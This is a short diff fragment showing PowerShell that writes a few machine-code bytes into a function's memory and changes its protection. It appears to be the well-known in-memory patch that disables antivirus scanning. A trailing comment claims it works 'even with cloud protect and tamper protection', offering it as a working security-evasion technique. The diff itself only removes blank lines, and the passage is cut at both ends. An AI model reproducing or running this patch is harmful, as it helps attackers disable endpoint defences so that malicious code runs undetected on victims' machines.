@@ -664,8 +664,6 @@ $buf = [Byte[]] (0x48, 0x31, 0xC0)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
 
 $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
-
-
 ```
 
 this works even with cloud protect and tamper protection
